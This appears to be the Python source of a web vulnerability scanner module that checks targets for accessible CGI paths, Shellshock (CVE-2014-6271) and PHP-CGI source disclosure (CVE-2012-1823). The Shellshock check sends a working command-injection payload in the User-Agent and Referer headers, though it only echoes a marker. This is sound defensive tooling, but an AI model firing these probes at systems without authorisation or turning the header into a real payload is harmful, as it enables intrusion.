import requests
import urllib3
from core.utils import OutputFormatter
from config.settings import Settings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CGIScanner:
    def __init__(self, target, logger):
        self.target   = target
        self.logger   = logger
        self.findings = []
        self.base_url = target if target.startswith("http") else f"http://{target}"
        self.session  = requests.Session()
        self.session.verify = False

    def _get(self, url, headers=None):
        try:
            return self.session.get(
                url, timeout=Settings.READ_TIMEOUT,
                headers=headers or {"User-Agent": Settings.USER_AGENTS[0]},
                verify=False,
            )
        except Exception:
            return None

    def cgi_discovery(self):
        self.logger.section("CGI Script Discovery")
        found = []
        for path in Settings.CGI_PATHS:
            r = self._get(f"{self.base_url}{path}")
            if r and r.status_code not in [404, 410]:
                self.logger.finding("medium", f"CGI path accessible: {path} [{r.status_code}]")
                found.append(path)
                self.findings.append(OutputFormatter.finding(
                    "web/cgi", "MEDIUM",
                    f"CGI Path Accessible: {path}",
                    f"Path returned HTTP {r.status_code}.",
                    recommendation="Disable CGI or restrict access to required scripts only.",
                ))
        if not found:
            self.logger.info("No accessible CGI paths found")
        return found

    def shellshock(self):
        self.logger.section("Shellshock Check (CVE-2014-6271)")
        shellshock_hdrs = {
            "User-Agent": "() { :;}; echo Content-Type: text/plain; echo; echo 'SHELLSHOCK_PE'",
            "Referer":    "() { :;}; echo Content-Type: text/plain; echo; echo 'SHELLSHOCK_PE'",
        }
        for path in Settings.CGI_PATHS:
            r = self._get(f"{self.base_url}{path}", headers=shellshock_hdrs)
            if r and "SHELLSHOCK_PE" in r.text:
                self.logger.finding("critical", f"Shellshock confirmed: {path}")
                self.findings.append(OutputFormatter.finding(
                    "web/cgi", "CRITICAL", "Shellshock (CVE-2014-6271)",
                    f"CGI script at {path} is vulnerable to Shellshock.",
                    evidence=r.text[:200],
                    recommendation="Update bash immediately. Patch or remove vulnerable CGI scripts.",
                ))
                return True
        self.logger.info("Shellshock not detected")
        return False

    def php_cgi_rce(self):
        self.logger.section("PHP CGI RCE Check (CVE-2012-1823)")
        r = self._get(f"{self.base_url}/index.php?-s")
        if r and "<?php" in r.text.lower():
            self.logger.finding("critical", "PHP CGI RCE (CVE-2012-1823) — source code disclosed")
            self.findings.append(OutputFormatter.finding(
                "web/cgi", "CRITICAL", "PHP CGI RCE — CVE-2012-1823",
                "PHP source code visible via query string injection.",
                recommendation="Update PHP. Disable CGI mode or add Apache rewrite rules.",
            ))
            return True
        self.logger.info("PHP CGI RCE not detected")
        return False

    def run(self):
        self.cgi_discovery()
        self.shellshock()
        self.php_cgi_rce()
